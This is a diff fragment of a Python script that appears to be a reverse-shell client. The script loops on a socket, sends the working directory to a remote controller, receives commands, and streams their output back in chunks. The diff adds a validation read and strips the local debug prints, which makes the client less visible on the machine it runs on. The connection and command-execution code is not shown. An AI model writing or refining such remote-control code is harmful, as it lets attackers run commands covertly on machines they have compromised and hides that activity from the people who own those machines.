@@ -19,12 +19,12 @@ while True:
         
         while True:
             try:
+                validation = s.recv(1024).decode().strip()
+
                 cwd = os.getcwd()
                 s.send(cwd.encode())
-                print(f"sent:\n{cwd.encode()}")
 
                 command = s.recv(1024).decode()
-                print(f"recv:\n{command}")
                 if command.lower() == "exit":
                     print("[+] Exit command received. Closing connection.")
                     s.close()
@@ -58,10 +58,8 @@ while True:
                 chunk_size = 1024
                 for i in range(0, len(output), chunk_size):
                     s.send(output[i:i + chunk_size])
-                    print(f"sent:\n{output[i:i + chunk_size]}")
 
                 s.send(b"<EOF>\n")
-                print(f"sent:\n{b"<EOF>\n"}")
 
             except Exception as e:
                 print(f"[-] Error during command execution: {e}")
